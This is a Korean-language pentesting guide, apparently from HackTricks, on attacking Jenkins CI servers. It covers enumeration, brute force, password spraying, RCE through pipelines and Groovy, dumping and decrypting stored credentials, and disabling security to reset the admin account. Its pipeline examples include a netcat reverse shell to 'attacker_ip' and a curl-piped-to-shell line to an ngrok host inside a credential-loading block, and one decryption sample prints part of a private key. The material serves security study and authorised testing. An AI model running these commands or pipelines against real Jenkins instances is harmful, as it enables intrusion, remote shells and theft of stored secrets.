# Jenkins Security

{% hint style="success" %}
AWS Hacking 학습 및 연습:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking 학습 및 연습: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 플랜**](https://github.com/sponsors/carlospolop)을 확인하세요!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**telegram 그룹**](https://t.me/peass)에 가입하거나, **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)을 팔로우하세요.**
* **PR을 제출하여** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 해킹 트릭을 공유하세요.

</details>
{% endhint %}

## 기본 정보

Jenkins는 파이프라인을 사용하여 거의 **모든** **프로그래밍 언어** 및 소스 코드 저장소 조합에 대해 **지속적 통합** 또는 **지속적 배포** (CI/CD) 환경을 설정하는 간단한 방법을 제공하는 도구입니다. 또한 다양한 일상 개발 작업을 자동화합니다. Jenkins는 개별 단계에 대한 **스크립트를 작성할 필요성을 제거하지는 않지만**, 빌드, 테스트 및 배포 도구의 전체 시퀀스를 수동으로 쉽게 구성할 수 있는 것보다 더 빠르고 견고하게 통합할 수 있는 방법을 제공합니다.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## 인증되지 않은 열거

(_/people_ 또는 _/asynchPeople_과 같이 현재 사용자를 나열하는) 인증 없이 흥미로운 Jenkins 페이지를 검색하려면 다음을 사용할 수 있습니다:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
인증 없이 명령을 실행할 수 있는지 확인하십시오:
```
msf> use auxiliary/scanner/http/jenkins_command
```
자격 증명 없이 _**/asynchPeople/**_ 경로나 _**/securityRealm/user/admin/search/index?q=**_에서 **사용자 이름**을 확인할 수 있습니다.

경로 _**/oops**_ 또는 _**/error**_에서 Jenkins 버전을 얻을 수 있습니다.

![](<../../.gitbook/assets/image (146).png>)

### 알려진 취약점

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## 로그인

기본 정보를 통해 **Jenkins에 로그인하는 모든 방법**을 확인할 수 있습니다:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 등록

**계정을 생성하고 로그인할 수 있는** Jenkins 인스턴스를 찾을 수 있습니다. 아주 간단합니다.

### **SSO 로그인**

또한 **SSO** **기능**/**플러그인**이 존재한다면 테스트 계정(예: 테스트 **Github/Bitbucket 계정**)을 사용하여 애플리케이션에 **로그인**을 시도해야 합니다. [**여기**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)에서의 트릭입니다.

### 무차별 대입 공격

**Jenkins**는 **비밀번호 정책**과 **사용자 이름 무차별 대입 공격 방지**가 부족합니다. **약한 비밀번호**나 **사용자 이름을 비밀번호로 사용하는 경우**가 있을 수 있으므로, 심지어 **반대로 된 사용자 이름을 비밀번호로 사용하는 경우**도 있을 수 있으므로 **사용자에 대해 무차별 대입 공격**을 하는 것이 중요합니다.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

[이 python 스크립트](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) 또는 [이 powershell 스크립트](https://github.com/chryzsh/JenkinsPasswordSpray)를 사용하세요.

### IP Whitelisting Bypass

많은 조직은 GitHub 또는 GitLab과 같은 **SaaS 기반 소스 제어 관리 (SCM) 시스템**을 Jenkins 또는 TeamCity와 같은 **내부, 자체 호스팅 CI** 솔루션과 결합합니다. 이 설정은 CI 시스템이 **SaaS 소스 제어 공급업체로부터 웹훅 이벤트를 수신**하여 주로 파이프라인 작업을 트리거할 수 있게 합니다.

이를 달성하기 위해 조직은 **SCM 플랫폼의 IP 범위**를 **화이트리스트**에 추가하여 **웹훅**을 통해 **내부 CI 시스템**에 접근할 수 있도록 허용합니다. 그러나 **누구나** GitHub 또는 GitLab에 **계정을 생성**하고 이를 **웹훅을 트리거**하도록 구성할 수 있으며, 잠재적으로 **내부 CI 시스템**에 요청을 보낼 수 있습니다.

확인: [https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Internal Jenkins Abuses

이 시나리오에서는 Jenkins에 접근할 수 있는 유효한 계정을 가지고 있다고 가정합니다.

{% hint style="warning" %}
Jenkins에 구성된 **Authorization** 메커니즘과 손상된 사용자의 권한에 따라 **다음 공격을 수행할 수 있을 수도 있고 없을 수도 있습니다.**
{% endhint %}

자세한 정보는 기본 정보를 확인하세요:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listing users

Jenkins에 접근할 수 있다면 [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)에서 다른 등록된 사용자를 나열할 수 있습니다.

### Dumping builds to find cleartext secrets

[이 스크립트](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py)를 사용하여 빌드 콘솔 출력과 빌드 환경 변수를 덤프하여 평문 비밀을 찾을 수 있습니다.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH 자격 증명 탈취**

손상된 사용자가 **새 Jenkins 노드를 생성/수정할 수 있는 충분한 권한**을 가지고 있고, 다른 노드에 접근하기 위한 SSH 자격 증명이 이미 저장되어 있다면, 그는 노드를 생성/수정하고 **호스트 키를 확인하지 않고 자격 증명을 기록할 호스트를 설정**하여 **그 자격 증명을 탈취**할 수 있습니다:

![](<../../.gitbook/assets/image (218).png>)

Jenkins ssh 자격 증명은 보통 **글로벌 제공자** (`/credentials/`)에서 찾을 수 있으므로, 다른 비밀을 덤프하는 것처럼 덤프할 수 있습니다. 자세한 내용은 [**비밀 덤프 섹션**](./#dumping-secrets)을 참조하세요.

### **Jenkins에서 RCE**

**Jenkins 서버에서 셸을 얻는 것**은 공격자에게 모든 **비밀**과 **환경 변수**를 유출하고, 동일한 네트워크에 있는 다른 기계를 **공격**하거나 **클라우드 자격 증명**을 수집할 기회를 제공합니다.

기본적으로 Jenkins는 **SYSTEM으로 실행**됩니다. 따라서 이를 손상시키면 공격자는 **SYSTEM 권한**을 얻게 됩니다.

### **프로젝트 생성/수정으로 RCE**

프로젝트를 생성/수정하는 것은 Jenkins 서버에서 RCE를 얻는 방법입니다:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovy 스크립트 실행으로 RCE**

새 프로젝트를 생성하는 것보다 더 은밀하게 Groovy 스크립트를 실행하여 RCE를 얻을 수도 있습니다:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### 파이프라인 생성/수정으로 RCE

**파이프라인을 생성/수정하여 RCE를 얻을** 수도 있습니다:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## 파이프라인 익스플로잇

파이프라인을 익스플로잇하려면 여전히 Jenkins에 접근할 수 있어야 합니다.

### 빌드 파이프라인

**파이프라인**은 **프로젝트의 빌드 메커니즘**으로도 사용될 수 있으며, 이 경우 파이프라인 구문을 포함하는 **파일을 저장소 내부에** 구성할 수 있습니다. 기본적으로 `/Jenkinsfile`이 사용됩니다:

![](<../../.gitbook/assets/image (127).png>)

파이프라인 구성 파일을 **다른 장소**(예: 다른 저장소)에 저장하여 **저장소 접근**과 파이프라인 접근을 **분리**하는 것도 가능합니다.

공격자가 **그 파일에 대한 쓰기 권한**을 가지고 있다면, **수정**하고 Jenkins에 접근하지 않고도 **파이프라인을 트리거**할 수 있습니다.\
공격자는 **일부 브랜치 보호를 우회**해야 할 수도 있습니다(플랫폼과 사용자 권한에 따라 우회할 수 있는지 여부가 다릅니다).

사용자 정의 파이프라인을 실행하는 가장 일반적인 트리거는 다음과 같습니다:

* 메인 브랜치(또는 다른 브랜치)에 대한 **풀 리퀘스트**
* 메인 브랜치(또는 다른 브랜치)에 대한 **푸시**
* 메인 브랜치를 **업데이트**하고 어떤 방식으로든 실행될 때까지 기다리기

{% hint style="info" %}
**외부 사용자**라면 다른 사용자/조직의 저장소의 **메인 브랜치에 PR을 생성**하고 **파이프라인을 트리거**할 수 있을 것이라고 기대하지 않아야 합니다... 하지만 **잘못 구성된 경우** 이를 **악용하여 회사 전체를 완전히 손상**시킬 수 있습니다.
{% endhint %}

### 파이프라인 RCE

이전 RCE 섹션에서는 [**파이프라인을 수정하여 RCE를 얻는**](./#rce-creating-modifying-pipeline) 기술이 이미 언급되었습니다.

### 환경 변수 확인

전체 파이프라인 또는 특정 단계에 대해 **평문 환경 변수를 선언**할 수 있습니다. 이 환경 변수는 **민감한 정보를 포함해서는 안 되지만**, 공격자는 항상 **모든 파이프라인** 구성/Jenkinsfile을 **확인**할 수 있습니다:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

Jenkins에서 비밀 정보가 일반적으로 어떻게 처리되는지에 대한 정보는 다음 기본 정보를 참조하십시오:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

자격 증명은 **글로벌 제공자** (`/credentials/`) 또는 **특정 프로젝트** (`/job/<project-name>/configure`)에 **범위가 지정될 수 있습니다**. 따라서, 모든 자격 증명을 유출하려면 비밀 정보를 포함하는 **모든 프로젝트를 최소한으로 손상시키고** 사용자 정의/오염된 파이프라인을 실행해야 합니다.

또 다른 문제는 파이프라인의 **env 내부에 비밀 정보를 얻으려면** 비밀 정보의 **이름과 유형을 알아야 한다는 것**입니다. 예를 들어, **`usernamePassword`** **비밀 정보**를 **`string`** **비밀 정보**로 **로드**하려고 하면 다음과 같은 **오류**가 발생합니다:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
여기 몇 가지 일반적인 비밀 유형을 로드하는 방법이 있습니다:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
이 페이지의 끝에서 **모든 자격 증명 유형을 찾을 수 있습니다**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**모든 비밀을 한 번에 덤프하는** 가장 좋은 방법은 **Jenkins** 머신을 **손상시키는 것**입니다 (예를 들어 **내장 노드**에서 리버스 셸을 실행) 그런 다음 **마스터 키**와 **암호화된 비밀**을 **유출**하고 오프라인에서 이를 복호화하는 것입니다.\
이 방법에 대한 자세한 내용은 [Nodes & Agents 섹션](./#nodes-and-agents) 및 [Post Exploitation 섹션](./#post-exploitation)에서 확인할 수 있습니다.
{% endhint %}

### 트리거

[문서](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)에서: `triggers` 지시어는 **파이프라인이 자동으로 다시 트리거되는 방법**을 정의합니다. GitHub 또는 BitBucket과 같은 소스와 통합된 파이프라인의 경우, `triggers`는 필요하지 않을 수 있으며, 웹훅 기반 통합이 이미 존재할 가능성이 높습니다. 현재 사용 가능한 트리거는 `cron`, `pollSCM` 및 `upstream`입니다.

Cron 예제:
```bash
triggers { cron('H */4 * * 1-5') }
```
**문서의 다른 예제를 확인하세요**.

### Nodes & Agents

**Jenkins 인스턴스**는 **다른 머신에서 다른 에이전트를 실행**할 수 있습니다. 공격자의 관점에서, 다른 머신에 접근하는 것은 **다른 잠재적 클라우드 자격 증명**을 훔치거나 **다른 네트워크 접근**을 악용하여 다른 머신을 공격할 수 있는 기회를 의미합니다.

자세한 정보는 기본 정보를 확인하세요:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

**구성된 노드**를 `/computer/`에서 열거할 수 있으며, 보통 \*\*`Built-In Node` \*\* (Jenkins를 실행하는 노드)와 잠재적으로 더 많은 노드를 찾을 수 있습니다:

![](<../../.gitbook/assets/image (249).png>)

**Built-In 노드를 손상시키는 것이 특히 흥미롭습니다**. 왜냐하면 이 노드는 민감한 Jenkins 정보를 포함하고 있기 때문입니다.

**파이프라인**을 **built-in Jenkins 노드**에서 **실행**하고 싶다면, 파이프라인 내부에 다음 설정을 지정할 수 있습니다:
```bash
pipeline {
agent {label 'built-in'}
```
### Complete example

특정 에이전트에서 파이프라인, cron 트리거, 파이프라인 및 스테이지 환경 변수, 단계에서 2개의 변수를 로드하고 리버스 쉘을 보내는 예제:

```markdown
pipeline {
    agent any
    triggers {
        cron('H/5 * * * *')
    }
    environment {
        PIPELINE_ENV = 'pipeline_value'
    }
    stages {
        stage('Example') {
            environment {
                STAGE_ENV = 'stage_value'
            }
            steps {
                script {
                    def stepVar1 = 'value1'
                    def stepVar2 = 'value2'
                    sh 'nc -e /bin/bash attacker_ip 4444'
                }
            }
        }
    }
}
```
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

당신이 충분한 권한을 가지고 있다면 `/credentials/`에 접근하여 비밀을 나열할 수 있습니다. 이는 `credentials.xml` 파일 내부의 비밀만 나열할 것이지만, **빌드 구성 파일**에도 **더 많은 자격 증명**이 있을 수 있습니다.

각 프로젝트의 **구성을 볼 수 있다면**, 저장소에 접근하기 위해 사용되는 **자격 증명(비밀)의 이름**과 **프로젝트의 다른 자격 증명**도 볼 수 있습니다.

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

다음 파일들은 **Jenkins 비밀을 복호화**하는 데 필요합니다:

* secrets/master.key
* secrets/hudson.util.Secret

이러한 **비밀은 보통 다음 위치에서 찾을 수 있습니다**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

다음을 찾기 위한 정규 표현식입니다:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Decrypt Jenkins secrets offline

만약 **비밀을 복호화하는 데 필요한 비밀번호를 덤프했다면**, [**이 스크립트**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py)를 사용하여 **그 비밀을 복호화**하십시오.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovy에서 Jenkins secrets 복호화
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Create new admin user

1. `/var/lib/jenkins/config.xml` 또는 `C:\Program Files (x86)\Jenkis\`에 있는 Jenkins config.xml 파일에 접근합니다.
2. `<useSecurity>true</useSecurity>`를 찾아서 **`true`**를 **`false`**로 변경합니다.
   1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** 서버를 **재시작**합니다: `service jenkins restart`
4. 이제 다시 Jenkins 포털로 이동하면 이번에는 **Jenkins가 자격 증명을 묻지 않습니다**. "**Manage Jenkins**"로 이동하여 **관리자 비밀번호를 다시 설정**합니다.
5. `<useSecurity>true</useSecurity>`로 설정을 변경하여 **보안을 다시 활성화**하고 **Jenkins를 다시 시작**합니다.

## References

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
